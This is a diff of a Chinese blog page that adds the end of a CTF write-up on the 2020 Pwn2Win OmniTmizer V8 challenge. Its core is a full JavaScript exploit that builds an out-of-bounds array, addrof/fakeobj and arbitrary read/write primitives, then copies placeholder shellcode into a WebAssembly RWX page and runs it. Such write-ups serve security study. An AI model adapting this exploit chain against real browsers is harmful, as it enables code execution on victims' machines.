+<p>输出：</p>
+<p><img src="/img/OmniTmizer/output1.png"></p>
+<p>还真可以，那就等于是越界了，那就不搞addrof和fakeobj，直接去写ArrayBuffer的backing_store岂不美滋滋</p>
+<p>带着这个思路，我们在oob的数组后面分配ArrayBuffer和BigUint64Array（用于泄露external_pointer），修改ArrayBuffer的backing_store来达到任意地址读写的目的，最后exp：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> format_buffer = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="built_in">Float64Array</span>(format_buffer);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(format_buffer);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> shellcode = [<span class="number">0x90909090</span>,<span class="number">0x90909090</span>,<span class="number">0xcccccccc</span>,<span class="number">0x90909090</span>]; </span><br><span class="line"><span class="keyword">var</span> wasmCode = <span class="keyword">new</span> <span class="built_in">Uint8Array</span>([<span class="number">0</span>,<span class="number">97</span>,<span class="number">115</span>,<span class="number">109</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">133</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">96</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">127</span>,<span class="number">3</span>,<span class="number">130</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">112</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">131</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">129</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">7</span>,<span class="number">145</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">6</span>,<span class="number">109</span>,<span class="number">101</span>,<span class="number">109</span>,<span class="number">111</span>,<span class="number">114</span>,<span class="number">121</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">4</span>,<span class="number">109</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">138</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">132</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">128</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">65</span>,<span class="number">42</span>,<span class="number">11</span>]);</span><br><span class="line">    </span><br><span class="line"><span class="keyword">var</span> wasmModule = <span class="keyword">new</span> WebAssembly.Module(wasmCode);</span><br><span class="line"><span class="keyword">var</span> wasmInstance = <span class="keyword">new</span> WebAssembly.Instance(wasmModule, &#123;&#125;);</span><br><span class="line"><span class="keyword">var</span> f = wasmInstance.exports.main;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">force_gc</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">0x20</span>; ++i) &#123;</span><br><span class="line">        <span class="keyword">var</span> a = <span class="keyword">new</span> <span class="built_in">ArrayBuffer</span>(<span class="number">0x800000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f2i</span>(<span class="params">f</span>)</span>&#123;</span><br><span class="line">    float64[<span class="number">0</span>] = f;</span><br><span class="line">    <span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">i2f</span>(<span class="params">i</span>)</span>&#123;</span><br><span class="line">    bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">    <span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">hex</span>(<span class="params">value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;0x&quot;</span> + value.toString(<span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LeakArrayBuffer</span> <span class="keyword">extends</span> <span class="title">ArrayBuffer</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="title">constructor</span>(<span class="params">size</span>)</span>&#123;</span><br><span class="line">        <span class="built_in">super</span>(size);</span><br><span class="line">        <span class="built_in">this</span>.slot = <span class="number">0xb33f</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> corrupt_arr = [<span class="number">1.1</span>,<span class="number">2.2</span>,<span class="number">3.3</span>,<span class="number">4.4</span>,<span class="number">5.5</span>];</span><br><span class="line"><span class="keyword">var</span> uint64array = <span class="keyword">new</span> <span class="built_in">BigUint64Array</span>(<span class="number">2</span>);        <span class="comment">// for leak external_pointer   </span></span><br><span class="line"><span class="keyword">var</span> padding = &#123;&#125;;</span><br><span class="line"><span class="keyword">var</span> target_buffer = <span class="keyword">new</span> LeakArrayBuffer(<span class="number">0x1000</span>);</span><br><span class="line"><span class="keyword">var</span> target_view = <span class="keyword">new</span> <span class="built_in">DataView</span>(target_buffer);</span><br><span class="line"><span class="keyword">var</span> bar = &#123;<span class="attr">x</span> : <span class="number">1</span>,<span class="attr">y</span> : <span class="number">2</span>&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params">a</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">let</span> x = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">let</span> y = <span class="number">1.1</span>;</span><br><span class="line">    x += <span class="number">1</span>;</span><br><span class="line">    y += <span class="number">2.2</span>;</span><br><span class="line">    a.x = <span class="number">400</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">var</span> i = <span class="number">0</span>;i &lt; <span class="number">60000</span>;i++)</span><br><span class="line">    foo(bar);</span><br><span class="line"></span><br><span class="line">foo(corrupt_arr);</span><br><span class="line"><span class="comment">// now corrupt_arr is oob Array!</span></span><br><span class="line"><span class="keyword">var</span> external_pointer = f2i(corrupt_arr[corrupt_arr.indexOf(i2f(<span class="number">0x10n</span>)) + <span class="number">2</span>]) - <span class="number">7n</span>;</span><br><span class="line"><span class="keyword">var</span> slot_idx = corrupt_arr.indexOf(i2f(<span class="number">0x1667e00000000n</span>));</span><br><span class="line"><span class="keyword">var</span> backing_store_idx = slot_idx - <span class="number">4</span>;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] external_pointer: &quot;</span> + hex(external_pointer));</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">objToPtr</span>(<span class="params">obj</span>)</span>&#123;</span><br><span class="line">    target_buffer.slot = obj;</span><br><span class="line">    <span class="keyword">let</span> ptr = (f2i(corrupt_arr[slot_idx]) &gt;&gt; <span class="number">32n</span>) - <span class="number">1n</span>;</span><br><span class="line">    target_buffer.slot = <span class="number">0xb33f</span>;</span><br><span class="line">    <span class="keyword">return</span> ptr;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">ptrToObj</span>(<span class="params">ptr</span>)</span>&#123;</span><br><span class="line">    corrupt_arr[slot_idx] = i2f((ptr | <span class="number">1n</span>) &lt;&lt; <span class="number">32n</span>);</span><br><span class="line">    <span class="keyword">let</span> obj = target_buffer.slot;</span><br><span class="line">    target_buffer.slot = <span class="number">0xb33f</span>;</span><br><span class="line">    <span class="keyword">return</span> obj;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getUint64</span>(<span class="params">address</span>)</span>&#123;</span><br><span class="line">    corrupt_arr[backing_store_idx] = i2f(address);</span><br><span class="line">    <span class="keyword">return</span> target_view.getBigUint64(<span class="number">0</span>,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUint64</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">    corrupt_arr[backing_store_idx] = i2f(address);</span><br><span class="line">    target_view.setBigUint64(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">setUint32</span>(<span class="params">address,value</span>)</span>&#123;</span><br><span class="line">    corrupt_arr[backing_store_idx] = i2f(address);</span><br><span class="line">    target_view.setUint32(<span class="number">0</span>,value,<span class="literal">true</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> wasm_instance_addr = objToPtr(wasmInstance) + external_pointer;</span><br><span class="line"><span class="keyword">var</span> rwx_page_addr = getUint64(wasm_instance_addr + <span class="number">0x68n</span>);</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[+] wasm_instance_addr: &quot;</span> + hex(wasm_instance_addr));</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">&quot;[*] rwx_page_addr : 0x&quot;</span> + rwx_page_addr.toString(<span class="number">16</span>));</span><br><span class="line"></span><br><span class="line"><span class="comment">// copy shellcode </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>;i &lt; shellcode.length;i++)&#123;</span><br><span class="line">    setUint32(rwx_page_addr + <span class="built_in">BigInt</span>(i*<span class="number">4</span>),shellcode[i]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">f();</span><br></pre></td></tr></table></figure>
+
+<h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>其实这题和EscapeAnalysis阶段的操作好像没什么相关的，感觉只是借这个阶段来把checkMaps节点来消除。</p>
+<p>我后面去看了下别人的分析文章，发现Array对象的前2个内存布局（map，property）居然可以硬编码，orz，这样就不用想尽脑汁去泄露map了</p>
+<h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p>Escape Analysis in V8 ：<a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=KiWEWLwQ3oI&amp;t=744s">https://www.youtube.com/watch?v=KiWEWLwQ3oI&amp;t=744s</a></p>
+<p>2020 Pwn2Win OmniTmizer Challenge：<a target="_blank" rel="noopener" href="https://yichenchai.github.io/blog/omnitmizer">https://yichenchai.github.io/blog/omnitmizer</a></p>
+
+      
+
+      
+    </div>
+    <div class="article-info article-info-index">
       
       
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-07-15T14:50:20.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-07-15</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/07/15/geekpwn%E7%BA%BF%E4%B8%8A%E8%B5%9B%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3/">GeekPwn云靶场挑战赛部分题解</a>
-    </h1>
-  
+      
 
-        <div class="article-info info-on-right">
-          
-          
+      
 
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="//pan.baidu.com/share/qrcode?url=http://yoursite.com/2022/01/26/pwn2winctf2020-OmniTmizer_new/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/" class="archive-article-date">
-  	<time datetime="2020-06-01T01:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-06-01</time>
-</a>
+<nav id="article-nav">
+  
+  
+    <a href="/2022/01/21/chrome-cve-2020-16040%E5%88%86%E6%9E%90/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">chrome cve-2020-16040 分析</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+<aside class="wrap-side-operation">
+    <div class="mod-side-operation">
+        
+        <div class="jump-container" id="js-jump-container" style="display:none;">
+            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
+                <i class="icon-font icon-back"></i>
+            </a>
+            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
+                <i class="icon-font icon-plane jump-plane"></i>
+            </div>
         </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/06/01/RCTF2020%E9%83%A8%E5%88%86%E9%A2%98%E8%A7%A3_ch/">RCTF2020部分题解</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
+        
+        
+        <div class="toc-container tooltip-left">
+            <i class="icon-font icon-category"></i>
+            <div class="tooltip tooltip-east">
+                <span class="tooltip-item">
+                </span>
+                <span class="tooltip-content">
+                    <div class="toc-article">
+                    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90"><span class="toc-number">1.</span> <span class="toc-text">题目分析</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E6%AC%A1%E5%B0%9D%E8%AF%95"><span class="toc-number">1.1.</span> <span class="toc-text">初次尝试</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#addrof"><span class="toc-number">1.2.</span> <span class="toc-text">addrof</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%90%8E%E8%AE%B0"><span class="toc-number">2.</span> <span class="toc-text">后记</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%82%E8%80%83%E8%B5%84%E6%96%99"><span class="toc-number">3.</span> <span class="toc-text">参考资料</span></a></li></ol>
+                    </div>
+                </span>
+            </div>
         </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
+        
+    </div>
+</aside>
+
+
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/" class="archive-article-date">
-  	<time datetime="2020-05-11T17:12:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        </div>
-    	 
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/12/%E7%A9%BA%E6%8C%87%E9%92%885%E6%9C%88%E5%85%AC%E5%BC%80%E8%B5%9Bpwn%E9%A2%98%E8%A7%A3/">空指针5月公开赛pwn题解</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/12/Linux-kernel-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E8%AE%B0/" class="archive-article-date">
-  	<time datetime="2020-05-11T16:21:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-12</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/12/Linux-kernel-%E6%BA%90%E7%A0%81%E8%B0%83%E8%AF%95%E8%B8%A9%E5%9D%91%E8%AE%B0/">Linux kernel 源码调试踩坑记录</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/11/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/" class="archive-article-date">
-  	<time datetime="2020-05-11T06:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-11</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/11/Sudo-CVE-2019-18634-%E5%A4%8D%E7%8E%B0/">Sudo CVE-2019-18634 复现</a>
-    </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/03/Leetcode_DFA/" class="archive-article-date">
-  	<time datetime="2020-04-03T03:11:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-03</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/03/Leetcode_DFA/">DFA</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/19/Suctf2019_sudrv/" class="archive-article-date">
-  	<time datetime="2020-02-19T13:38:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-19</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/19/Suctf2019_sudrv/">Suctf2019_sudrv</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/17/HackTM2020-trip_to_trick/" class="archive-article-date">
-  	<time datetime="2020-02-17T13:19:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-17</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/17/HackTM2020-trip_to_trick/">HackTM2020 trip_to_trick</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/" class="archive-article-date">
-  	<time datetime="2020-02-14T08:17:49.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-14</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/14/Netatalk-CVE-2018-1160-%E5%88%86%E6%9E%90/">Netatalk CVE-2018-1160 分析</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/02/04/HITCON2019-Quals-One-punch-Man/" class="archive-article-date">
-  	<time datetime="2020-02-04T13:19:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-02-04</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/02/04/HITCON2019-Quals-One-punch-Man/">HITCON2019-Quals One_punch_Man</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/archives/page/3/">Prev</a><a class="page-number" href="/archives/">1</a><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="page-number current">4</span>
-    </nav>
   
 
 
@@ -448,8 +379,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
